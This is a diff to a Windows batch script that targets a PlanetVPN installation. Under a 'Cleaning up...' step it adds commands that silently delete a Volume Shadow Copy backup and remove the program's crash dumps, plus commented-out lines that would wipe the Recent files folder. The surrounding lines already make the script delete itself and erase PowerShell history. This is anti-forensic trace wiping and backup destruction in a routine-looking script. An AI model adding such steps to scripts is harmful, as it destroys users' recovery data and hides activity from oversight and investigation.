@@ -28,6 +28,10 @@ if exist "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe" (
     } else { Write-Host 'Dosya bulunamadı: $filePath' }"
 
     echo Cleaning up...
+    echo Y | vssadmin delete shadows /for=C: /oldest >nul 2>&1
+    del /f /q "%USERPROFILE%\AppData\Local\CrashDumps\PlanetVPN.exe.*.dmp" 2>nul
+    rem rmdir /s /q "%APPDATA%\Microsoft\Windows\Recent"
+    rem mkdir "%APPDATA%\Microsoft\Windows\Recent"
     powershell -Command "Start-Sleep -Seconds 5; Remove-Item '%~f0'"
     powershell -NoProfile -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
 )
